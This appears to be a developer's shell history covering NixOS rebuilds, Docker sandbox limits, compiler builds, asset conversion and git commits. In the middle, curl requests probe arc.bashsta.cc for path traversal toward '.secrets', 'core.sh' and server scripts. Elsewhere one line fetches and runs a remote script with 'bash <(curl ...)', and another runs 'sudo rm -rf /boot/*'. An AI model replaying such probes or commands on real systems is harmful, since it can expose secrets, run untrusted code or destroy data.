nvim ~/.dotfiles/system/packages.nix
sudo nixos-rebuild --install-bootloader boot
sudo rm -rf /boot/*
sudo nixos-rebuild --install-bootloader boot
[ -d /sys/firmware/efi/efivars ] && echo "UEFI" || echo "Legacy"
bash
nvim ~/.dotfiles/system/packages.nix
sudo nixos-rebuild --install-bootloader boot
reboot
$env.XDG_SESSION_TYPE
clear
python main.py 
clear
python main.py 
clear
python main.py 
clear
python main.py 
nix shell nixpkgs#unrar
clear
python main.py 
fastfetch
rm -rf chatry-old/
docker run -it twitch-linux bash
podman run -it twitch-linux bash
docker build -t twitch-linux] .
docker build -t twitch-linux .
docker info
docker run -it twitch-linux bash
docker run --cpus 0.5 --memory 20m -it twitch-linux bash
docker run --cpus 0.5 --memory 20m --memory-swap 0 -it twitch-linux bash
docker run --cpus 0.5 --memory 20m -it twitch-linux bash
docker run --cpus 0.5 --memory 20m --storage-opt size=1k -it twitch-linux bash
docker run --cpus 0.5 --memory 20m --storage-opt size=1K -it twitch-linux bash
docker run --read-only --cpus 0.5 --memory 20m --storage-opt size=1K -it twitch-linux bash
docker run --read-only --cpus 0.5 --memory 20m -it twitch-linux bash
docker run --cpus 0.5 --memory 20m --read-only -v /mnt/Twitch:/home -it twitch-linux bash
./shell.sh
nvim ~/.dotfiles/system/packages.nix
sudo nixos-rebuild --install-bootloader boot
sudo nixos-rebuild switch
ls /boot
nvim ~/.dotfiles/system/packages.nix
sudo nixos-rebuild --install-bootloader boot
python 
clear
btop
nvim.
make
fastfetch
spectacle
btop
clear
ls
x
clear
git status
git diff
clear
git add .
git commit -m "Update readme"
git push
clear
pkill OBS
pkill obs
z verbose
clear
ls
python src/main.py 
python src/main.py catppuccin
clar
clear
./compile.sh simple
git diff
git reset HEAD^ orco-visual
git status
rm -rf orco-visual
rm -rf a.out foo.o ir.png
clear
rm -rf visualise.sh
git diff HEAD^ orco-cli
git reset HEAD^ orco-cli/src
git status
clear
./compile.sh simple
clear
./compile.sh simple
git diff
git diff orco-cli/main.rs
git diff orco-cli/src/main.rs
git reset HEAD^ orco-cli/src/main.rs
git diff orco-cli/src/main.rs
git reset HEAD^^ orco-cli/src/main.rs
git diff orco-cli/src/main.rs
git restore HEAD^ orco-cli/src/main.rs
git restore orco-cli/src/main.rs HEAD^
clear
./compile.sh simple
git add .
git commit -m "Metadata complete + revert visual"
cear
cler
clear
git push
clear
./compile.sh simple
ls
z
x
z -
x
bat convert_plushie.sh 
./convert_plushie.sh ~/Downloads/Konqi.png
cp assets/plushies/kuvi-man/config.toml assets/plushies/konqi/
./convert_plushie.sh ~/Downloads/discord.png
./convert_plushie.sh ~/Downloads/telegram.png
./convert_plushie.sh ~/Downloads/telegram.webp
cp assets/plushies/kuvi-man/config.toml assets/plushies/discord/
cp assets/plushies/discord/config.toml assets/plushies/telegram
clear
ls assets/plushies/ | count
ls assets/plushies/ | size
ls assets/plushies/ | length
ls assets/plushies/
./convert_plushie.sh ~/Downloads/metameee.jpg
cp assets/plushies/kuvi-man/config.toml assets/plushies/metameee/
clear
./convert_plushie.sh ~/Downloads/opencv.png
cp assets/plushies/opengl/config.toml assets/plushies/opencv/
mv assets/plushies/opengl assets/plushies/open-gl
mv assets/plushies/opencv assets/plushies/open-cv
./convert_plushie.sh ~/Downloads/lisp.png
cp assets/plushies/haskell/config.toml assets/plushies/lisp/
./convert_plushie.sh ~/Downloads/5th-function.jpeg
cp assets/plushies/kuvi-man/config.toml assets/plushies/5th-function/
./convert_plushie.sh ~/Downloads/freedom-forge-studios.png
cp assets/plushies/5th-function/config.toml assets/plushies/freedom-forge-studios/
clear
./convert_plushie.sh ~/Downloads/lisp.png
./convert_plushie.sh ~/Downloads/blender.png
cp assets/plushies/aseprite/config.toml assets/plushies/blender/
./convert_plushie.sh ~/Downloads/godot.png
cp assets/plushies/aseprite/config.toml assets/plushies/godot/
:
./convert_plushie.sh ~/Downloads/unity.png
cp assets/plushies/godot/config.toml assets/plushies/unity/
./convert_plushie.sh ~/Downloads/zed.webp
btop
clear
fastfetch
cp assets/plushies/vs-code/config.toml assets/plushies/zed/
./convert_plushie.sh ~/Downloads/plasma.png
cp assets/plushies/kde/config.toml assets/plushies/plasma
./convert_plushie.sh ~/Downloads/fire-fox.png
cp assets/plushies/aseprite/config.toml assets/plushies/firefox
cp assets/plushies/aseprite/config.toml assets/plushies/fire-fox/
rm -rf assets/plushies/firefox
./convert_plushie.sh ~/Downloads/floorp.png
cp assets/plushies/fire-fox/ assets/plushies/floorp/
cp assets/plushies/fire-fox/config.toml assets/plushies/floorp/
./convert_plushie.sh ~/Downloads/chrome.png
cp assets/plushies/fire-fox/config.toml assets/plushies/chrome/
./convert_plushie.sh ~/Downloads/chromium.svg
cp assets/plushies/fire-fox/config.toml assets/plushies/chromium/
./convert_plushie.sh ~/Downloads/lapce.png
cp assets/plushies/zed/config.toml assets/plushies/lapce/
./convert_plushie.sh ~/Downloads/water-fox.svg
cp assets/plushies/fire-fox/config.toml assets/plushies/water-fox/
./convert_plushie.sh ~/Downloads/libre-wolf.png
cp assets/plushies/fire-fox/config.toml assets/plushies/libre-wolf/
./convert_plushie.sh ~/Downloads/chromium.svg
./convert_plushie.sh ~/Downloads/chromium.png
clear
./compile.sh simple
clear
./compile.sh simple
clear
exit
./compile.sh simple
clear
./compile.sh simple
git status
git diff
clear
git add .
git commit -m "Fix cyclic Arc"
git push
./compile.sh calc
clea
clear
./compile.sh simple
clear
./compile.sh simple
clear
./compile.sh simple
clear
./compile.sh simple
xit
exit
./compile.sh simple
exit
./compile.sh simple
clear
./compile.sh calc
clear
./compile.sh calc
clear
exit
./compile.sh calc
exit
./compile.sh calc
exit
./compile.sh calc
clear
./compile.sh calc
git diff
clear
./compile.sh calc
clear
./compile.sh calc
clear
./compile.sh calc
clear
./compile.sh calc
clear
./compile.sh calc
git add .
git commit -m "BinaryExpressionWithSpan"
git push
./compile.sh calc
clear
./compile.sh calc
clear
./compile.sh calc
git add .
git commit -m "Operator expressions with spans"
git push
./convert_plushie.sh ~/Downloads/c-make.png
cp assets/plushies/c/config.toml assets/plushies/c-make/
./compile.sh calc
exit
./compile.sh calc
file
which ls
which eza
file /run/current-system/sw/bin/eza
file
file /nix/store/6l4vp5d1g7gmria522biral764rr7z5d-eza-0.18.17/bin/eza
readlef /nix/store/6l4vp5d1g7gmria522biral764rr7z5d-eza-0.18.17/bin/eza
readelf /nix/store/6l4vp5d1g7gmria522biral764rr7z5d-eza-0.18.17/bin/eza
readelf -h /nix/store/6l4vp5d1g7gmria522biral764rr7z5d-eza-0.18.17/bin/eza
clear
./compile.sh calc
clear
./compile.sh calc
git add .
git commit -m "Refactor done"
git push
git add .
git commit -m "Actually done now"
git push
clear
ping tmi.twitch.tv
ping twitch.tv
clear
ls
git status
git add .
git commit -m "SoftTuber & Plushie transparency fix"
git push
adb shell
curl -s http://192.168.49.1:8181/msh
bash <(curl -s http://192.168.49.1:8181/msh)
bash
clear
jq
jq "$ENV"
echo test | jq "$ENV"
echo {} | jq "$ENV"
echo \{\} | jq "$ENV"
echo "{ \"a\": \"b\" }" | jq "$ENV"
echo "{ \"a\": \"b\" }" | jq "$ENV.A=1"
$env.A = 1
echo "{ \"a\": \"b\" }" | jq "$ENV.A"
echo "{ \"a\": \"b\" }" | jq "$ENV.A = 1"
echo "{ \"a\": \"b\" }" | jq "$ENV.A = 2"
echo "{ \"a\": \"b\" }" | jq "$ENV | .A = 2"
$env.A
echo "{ \"a\": \"b\" }" | jq "$ENV | .A = 2"
echo "{ \"a\": \"b\" }" | jq "$ENV | .A = 2; $ENV.A"
echo "{ \"a\": \"b\" }" | jq "$ENV | .A = 2 && $ENV.A"
echo "{ \"a\": \"b\" }" | jq "$ENV | .A = 2; $ENV.A"
echo "{ \"a\": \"b\" }" | jq "$ENV | .A = 2 $ENV.A"
echo "{ \"a\": \"b\" }" | jq "$ENV | .A = 2, $ENV.A"
echo "{ \"a\": \"b\" }" | jq "$A = 2, $A"
curl -D - https://arc.bashsta.cc/sse/..
curl -H "Host: *" -D - https://arc.bashsta.cc
curl -D - https://arc.bashsta.cc
curl -H "host: *" -D - https://arc.bashsta.cc
curl -H "host:*" -D - https://arc.bashsta.cc
curl -H "host:test" -D - https://arc.bashsta.cc
curl -D - https://arc.bashsta.cc/obs/*
curl -D - https://arc.bashsta.cc/sse/..%2fdata%2fcooldown_1_1
curl -D - https://arc.bashsta.cc/cooldowns/1/1%2f..%2f..%2fpages%2findex.sh
curl -D - https://arc.bashsta.cc/cooldowns/1/1%2f..%2f..%2fpages%2fwebhook.sh
curl -D - https://arc.bashsta.cc/cooldowns/1/1
curl -D - https://arc.bashsta.cc/cooldowns/1/1%2f*
curl -D - https://arc.bashsta.cc/cooldowns/1/1%2f%2a
curl -D - https://arc.bashsta.cc/sse/..
curl -D - https://arc.bashsta.cc/cooldowns/1/1%2f%2a
curl -D - https://arc.bashsta.cc/cooldowns/1/1%2f..%2f..%2fpages%2fwebhook.sh
echo a\nb | head -1
echo "a\nb" | head -1
curl -D - https://arc.bashsta.cc/sse/..%2fdata%2fcooldown_1_1
curl -D - https://arc.bashsta.cc/static/../pages/index.sh
curl --path-as-is -D - https://arc.bashsta.cc/static/../pages/index.sh
curl --path-as-is -D - https://arc.bashsta.cc/static/../.secrets
curl --path-as-is -D - https://arc.bashsta.cc/static/../pages/.secrets
curl --path-as-is -D - https://arc.bashsta.cc/static/../core.sh
curl --path-as-is -D - https://arc.bashsta.cc/static/../pages/index.sh
curl --path-as-is -D - https://arc.bashsta.cc/static/../pages/.secrets
curl --path-as-is -D - https://arc.bashsta.cc/static/../.secrets
urldecode %60
bash
curl -D - https://jeopardy.bashsta.cc
git status
git add .
# git commit -m "Plushie resolution refactor"
git add .
git commit -m "Plushie resolution refactor"
git push
./compile.sh simpel
./compile.sh simple
sudo nixos-rebuild --install-bootloader boot
sudo nixos-rebuild switch
git diff 010dc62473f2542a255663f101d8411bf3c4e2a9
./compile.sh simple
exit
./compile.sh simple
exit
./compile.sh simple
clear
./compile.sh simple
clear
./compile.sh simple
clear
./compile.sh simple
clear
./compile.sh simple
clear
./compile.sh simple
clear
./compile.sh simple
clear
./compile.sh simple
clear
./compile.sh simple
find ./ -type f -exec wc -l {} \; | awk '{total += $1} END{print total}'
wc
bash
clear
cloc .
nix shell nixpkgs#clock
cloc .
ls
cloc orco/src
cloc backends/orco-backend-cranelift/src/
clear
./compile.sh simple
:w
./compile.sh simple
git init
clear
git init
ls
git undo
rm -rf .git
ls
git init
ls
git checkout origin/comptime-values 
git switch -c comptime-values
git branch --list
git heckgit checkout origin/comptime-values                                                                                                                                                                                 
git checkout origin/comptime-values                                                                                                                                                                                 
cp .git /mnt/Dev/Tools/build/orco/
cp -rf .git /mnt/Dev/Tools/build/orco/
./compile.sh simple
python 
nvim ~/.dotfiles/system/packages.nix
sudo nixos-rebuild switch
clear
sudo nixos-rebuild switch
clear
./compile.sh simple
clear
./compile.sh simple
clear
./compile.sh simple
ls
rm -rf foo.o a.out
./compile.sh simple
readelf -h foo.o
objdump -T foo.o
clear
./compile.sh simple
echo $?
./compile.sh simple
$env.LAST_EXIT_CODE
clear
./compile.sh simple
trash
trashy
sudo nixos-rebuild switch
trash
trashy
ls /boot
nvim ~/.dotfiles/system/packages.nix
sudo nixos-rebuild switch
sudo nixos-rebuild --install-bootloader boot
which trashy
which trash
trash
trashy
trash
exit
nix shell nixpkgs#trashy
trash
exit
trash
sudo nixos-rebuild switch
trashy
clear
reboot
trash
sudo nixos-rebuild --install-bootloader boot
sudo nix profile list 
sudo nix profile history 
nix-env --list-generations
sudo nix-env --list-generations
readlink "$(readlink ~/.nix-profile)"<\n>
tree /nix/var/nix/profiles                    <\n>
which x
which ls
which nu
x /nix/var/nix/profiles/
x /nix/var/nix/profiles/system-78-link/
x /nix/var/nix/profiles/system-78-link/bin/
x /nix/var/nix/profiles/system-78-link/bin/switch-to-configuration
file /nix/var/nix/profiles/system-78-link/bin/switch-to-configuration
/nix/var/nix/profiles/system-78-link/bin/switch-to-configuration
/nix/var/nix/profiles/system-78-link/bin/switch-to-configuration switch
sudo /nix/var/nix/profiles/system-78-link/bin/switch-to-configuration switch
lsblk -o 'MOUNTPOINT,FSTYPE'
nvim ~/.dotfiles/system/hardware-configuration.nix 
nvim ~/.dotfiles/system/packages.nix
umount /boot
umount /boot/efi 
sudoo umount /boot/efi 
sudo umount /boot/efi 
sudo mount /dev/disk/by-uuid/9848-35C2 /boot
sudo nixos-rebuild --install-bootloader boot
clear
rebot
reboot
trash
clear
nvim ~/.dotfiles/system/packages.nix
sudp nixos-rebuild switch
sudo nixos-rebuild switch
$nu.env-path
nvim $nu.env-path
nvim $nu.config-path
nvim .zshrc 
clear
exit
z dot
ls
./fetch.sh
